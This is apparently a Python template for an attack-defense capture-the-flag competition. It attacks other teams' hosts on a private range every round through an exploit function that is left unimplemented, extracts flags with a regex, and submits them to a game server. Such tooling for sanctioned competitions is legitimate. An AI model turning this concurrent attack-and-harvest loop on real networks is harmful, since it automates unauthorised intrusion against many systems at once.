import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from pwn import context, log, remote

# ── CONFIGURATION ─────────────────────────────────────────────────────────────

# Own team protection (avoids attacking self & submitting own flags)
MY_TEAM = 1                         # Your team ID/number (set to None if not applicable)
OWN_HOSTS = [                       # Explicit list of own team hosts/IPs to exclude
    f"10.60.{MY_TEAM}.1" if MY_TEAM else "127.0.0.1"
]

# Team list & target generator
TEAMS = [t for t in range(1, 21) if t != MY_TEAM]
PORT = 8000                         # Target service port

# Generate targets (filter out own hosts)
TARGETS = [
    f"10.60.{team}.1" for team in TEAMS 
    if f"10.60.{team}.1" not in OWN_HOSTS
]
# TARGETS = [f"http://10.60.{team}.1:{PORT}" for team in TEAMS]
# TARGETS = [(f"10.60.{team}.1", PORT) for team in TEAMS]

TICK_INTERVAL = 60                  # CTF round / tick duration in seconds
TIMEOUT = 5                         # Connection and request timeout
MAX_WORKERS = 20                    # Number of concurrent threads

# General flag regex pattern (adjust according to CTF rules)
FLAG_REGEX = re.compile(r"[A-Za-z0-9_]{3,16}\{[A-Za-z0-9_+\-=/]{16,}\}")

# ── SUBMISSION CONFIG ─────────────────────────────────────────────────────────

# Submission mode: "http_json", "http_form", or "tcp"
SUBMIT_MODE = "http_json"

# HTTP API Config (CTFd / Siberlab / Custom HTTP)
SUBMIT_URL = "http://10.10.0.1/api/v1/flags"
SUBMIT_TOKEN = "YOUR_TEAM_FLAG_TOKEN"
SUBMIT_HEADERS = {
    "Authorization": f"Bearer {SUBMIT_TOKEN}",
    "X-Team-Token": SUBMIT_TOKEN,
    "Content-Type": "application/json",
}

# Raw TCP Flag Submitter Config (Gameserver TCP / Destructive Farm)
SUBMIT_HOST = "10.10.0.1"
SUBMIT_PORT = 31337

# =============================================================================
# [SERVICE EXPLOIT]
# Put your service exploit function below.
#
# Requirements:
# 1. Accepts a target identifier (`str` IP/URL or `tuple` (host, port)).
# 2. Returns a flag string, list of flags, raw response text, or None.
# 3. Handle specific protocol errors or allow generic exceptions to bubble up.
# =============================================================================

def exploit(target) -> str | list[str] | None:
    """
    Example HTTP exploit:
    """
    # session = requests.Session()
    # res = session.get(f"http://{target}:{PORT}/vuln_endpoint", timeout=TIMEOUT)
    # return res.text

    """
    Example TCP / Binary exploit with pwntools:
    """
    # host, port = target if isinstance(target, tuple) else (target, PORT)
    # io = remote(host, port, timeout=TIMEOUT)
    # io.sendlineafter(b"prompt:", b"payload")
    # data = io.recvall(timeout=TIMEOUT).decode(errors="replace")
    # io.close()
    # return data

    raise NotImplementedError("Implement your exploit logic inside exploit(target)")

# ── SUBMISSION HANDLERS ───────────────────────────────────────────────────────

def submit_flags_http_json(flags: list[str]) -> tuple[bool, str]:
    payload = {"flags": flags}
    try:
        resp = requests.post(SUBMIT_URL, headers=SUBMIT_HEADERS, json=payload, timeout=TIMEOUT)
        return resp.ok, f"HTTP {resp.status_code}: {resp.text[:80]}"
    except Exception as e:
        return False, str(e)


def submit_flags_http_form(flags: list[str]) -> tuple[bool, str]:
    try:
        resp = requests.post(SUBMIT_URL, headers=SUBMIT_HEADERS, data={"flag": flags[0]}, timeout=TIMEOUT)
        return resp.ok, f"HTTP {resp.status_code}: {resp.text[:80]}"
    except Exception as e:
        return False, str(e)


def submit_flags_tcp(flags: list[str]) -> tuple[bool, str]:
    try:
        io = remote(SUBMIT_HOST, SUBMIT_PORT, timeout=TIMEOUT)
        for flag in flags:
            io.sendline(flag.encode())
        resp = io.recvline(timeout=TIMEOUT).decode(errors="replace").strip()
        io.close()
        return True, resp
    except Exception as e:
        return False, str(e)


def submit(flags: list[str]) -> tuple[bool, str]:
    if SUBMIT_MODE == "http_json":
        return submit_flags_http_json(flags)
    elif SUBMIT_MODE == "http_form":
        return submit_flags_http_form(flags)
    elif SUBMIT_MODE == "tcp":
        return submit_flags_tcp(flags)
    else:
        return False, f"Unknown SUBMIT_MODE: {SUBMIT_MODE}"

# ── FARMING ENGINE ────────────────────────────────────────────────────────────

seen_flags: set[str] = set()
seen_lock = threading.Lock()

def is_own_target(target) -> bool:
    host_str = str(target[0] if isinstance(target, tuple) else target)
    return any(own in host_str for own in OWN_HOSTS)


def extract_flags(data: str | list[str] | None) -> list[str]:
    if not data:
        return []
    if isinstance(data, list):
        extracted = []
        for item in data:
            extracted.extend(FLAG_REGEX.findall(str(item)))
        return list(set(extracted))
    return list(set(FLAG_REGEX.findall(str(data))))


def attack_target(target) -> tuple[any, list[str], str | None]:
    if is_own_target(target):
        return target, [], "Skipped: own host protection"
    try:
        result = exploit(target)
        flags = extract_flags(result)
        return target, flags, None
    except Exception as e:
        return target, [], str(e)


def run_tick(tick_num: int) -> None:
    prog = log.progress(f"Tick {tick_num} - Launching attacks on {len(TARGETS)} targets")
    discovered_flags: list[tuple[any, str]] = []

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(attack_target, target): target for target in TARGETS}
        for future in as_completed(futures):
            target, flags, error = future.result()
            if error:
                if "Skipped" in error:
                    log.info(f"[{target}] {error}")
                else:
                    log.warning(f"[{target}] Error: {error}")
            elif flags:
                for flag in flags:
                    discovered_flags.append((target, flag))
                    log.success(f"[{target}] Extracted: {flag}")
            else:
                log.info(f"[{target}] No flags found")

    prog.success(f"Discovered {len(discovered_flags)} flag(s)")

    # Filter out already submitted flags
    new_flags = []
    with seen_lock:
        for target, flag in discovered_flags:
            if flag not in seen_flags:
                new_flags.append(flag)
                seen_flags.add(flag)

    if not new_flags:
        log.info("No new flags to submit.")
        return

    # Submit newly captured flags
    sub_log = log.progress(f"Submitting {len(new_flags)} new flag(s)")
    ok, response = submit(new_flags)
    if ok:
        sub_log.success(f"Response: {response}")
    else:
        sub_log.failure(f"Failed to submit: {response}")

# ── ENTRYPOINT ────────────────────────────────────────────────────────────────

def main() -> None:
    context.log_level = "info"
    log.info(f"CTF A&D Modular Farm Started [Mode: {SUBMIT_MODE} | Interval: {TICK_INTERVAL}s]")
    log.info(f"Targets configured: {len(TARGETS)} (Own hosts excluded: {OWN_HOSTS})")

    tick = 1
    while True:
        start_time = time.time()
        run_tick(tick)
        tick += 1

        elapsed = time.time() - start_time
        sleep_duration = max(0.0, TICK_INTERVAL - elapsed)
        timer = log.progress(f"Sleeping {sleep_duration:.1f}s until next tick")
        time.sleep(sleep_duration)
        timer.success("Starting next round")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.info("Process interrupted by user. Exiting...")
